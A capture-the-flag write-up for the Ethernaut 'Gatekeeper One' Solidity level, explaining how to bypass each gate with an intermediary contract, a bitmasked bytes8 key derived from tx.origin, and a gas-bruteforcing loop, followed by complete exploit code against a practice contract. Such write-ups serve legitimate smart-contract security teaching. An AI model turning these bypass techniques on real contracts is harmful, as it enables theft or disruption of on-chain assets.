![](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)

Make it past the gatekeeper and register as an entrant to pass this level.
##### Things that might help:
- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the special function `gasleft()`, in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Analysis
### Gate One

```sol
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

This modifier makes sure that the `msg.sender` should not be the `tx.origin`. This is similar to [Level 04 - Telephone](https://blog.dixitaditya.com/ethernaut-level-04-telephone).

To make sure our `msg.sender` and `tx.origin` are different, we need to create an intermediary contract that will make function calls to the Gatekeeper contract. This will make our caller's address the `tx.origin` and our deployed contract's address will be the `msg.sender` as received by the Gatekeeper.

---
### Gate Three

We will do the third gate before the second one because we need to make sure our logic clears this gate and does not revert due to this. This will make clearing the second gate easier.

```sol
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
}
```

This gate has three requirements and to properly go through them, we need to understand the concept of data type downcasting and upcasting along with bitmasking.

When you convert a bigger data type into a smaller one such as `uint32` into `uint16`, the smaller variable will lose some data. Eg: If I have a variable `uint32 someVar = 0x12345678` and I convert it into `uint16`, I'll be left with `0x5678`.

Similarly, if I wanted to convert `uint16` into `uint32`, the above value will become `0x00005678`.

Let's now talk about Bit masking. This is just the `&` bitwise operation. Eg: `1 AND 0` will be 0. `1 AND 1` will become 1. We will make use of bitmasking when we submit the final key to this gate.

With the above techniques in hand, let's try to clear this gate. Let's assume that we have to send the following value as our key - `0x B1 B2 B3 B4 B5 B6 B7 B8`. We are taking 8 bytes because the function `enter()` needs an argument of `bytes8 _gateKey`.

1. The first statement asks us to satisfy the following condition:
```
    0x B5 B6 B7 B8 == 0x 00 00 B7 B8
``` 
We can see that B5 and B6 will be 0.

2. The second statement will become:
```
    0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8
``` 
This shows that the bytes B1, B2, B3, and B4 can be anything but 0.

3. The third statement will be:
```
    0x B5 B6 B7 B8 == 0x 00 00 (last two bytes of tx.origin)
``` 
We can see that B7 and B8 will be the last two bytes of the address of our `tx.origin`.

Therefore, the key will be:

```
0x ANY_DATA ANY_DATA ANY_DATA ANY_DATA 00 00 SECOND_LAST_BYTE_OF_ADDRESS LAST_BYTE_OF_ADDRESS
```

This was all about data type conversion. Now let's see how the bitmasking comes into play.

Since we need to use our `tx.origin` address to build our key, we can use the AND operation to set the value of B5 and B6 to 0, and the last two bytes (FFFF) to our `tx.origin`'s last two bytes i.e.,

```
bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF
```

Here, we are taking `uint64` value of `tx.origin` since we need 8 bytes and doing an AND operation with the value `0xFFFFFFFF0000FFFF`.

Compare it with our 0xB1B2B3B4B5B6B7B8 example shown above. The first four bytes are all `F` (not 0), B5 and B6 are 0, and the last two bytes are F because this will help retain our last two address bytes.

This will give us our final key needed to clear the gate.

---
### Gate Two

```sol
modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
}
```

`gasleft()` tells us the remaining gas after the execution of the statement. To clear gate two, we need to make sure that the statement `gasleft() % 8191 == 0`, i.e., our supplied gas input should be a multiple of 8191.

So how do we decide the exact number of gas to send? There are two ways.

Either use Remix debugger to step through each function and when the `gasleft` statement is reached, count the gas and work backward to arrive at the correct number which is too much work and we won't go there.

The other smart move is to just bruteforce the function and increment the gas in each function call until one of the values hits the spot.

---
## The Exploit

Let's look at our [exploit code](https://github.com/az0mb13/ethernaut-foundry/blob/master/src/level13.sol):

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel13.sol";

contract LetMeThrough {

    GatekeeperOne level13 = GatekeeperOne(0x27F9AB03aEd76ba2E93Ad7D8AcEE743b1F59b3ee);

    function exploit() external{
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
```

Let us go through the code line by line.

- The function `exploit()` defines a `_gateKey` derived from our `tx.origin` and the bit masking value `0xFFFFFFFF0000FFFF` as discussed in the above section. This is then casted into `bytes8` and stored in the variable.
- We are making using of `.call()` to make a function call to the `enter()` function. This will allow us to specify the exact amount of gas to send.
- There's a `for` loop which goes from 0 to 300. This is just a random value I chose.
- The amount of gas is in the form of `i + (8191 * k)`. Assuming that `i` is the amount of gas used before the function `gasleft()` was called, and the remaining is a multiple of 8191. If we fix `k` at a certain value, all we need is to find `i`. I'll take `k` to be 3 and `i` will go from 0 to 300.
- Once the loop starts, since the function `enter()` returns a `bool`, we are storing the return in a `success` variable and checking if it's true, therefore breaking the loop once our gas value is accepted.

Now we just need to deploy this contract on the Rinkeby network and call our `exploit()` function to trigger the exploit.

___
Well done! Next, try your hand with the second gatekeeper...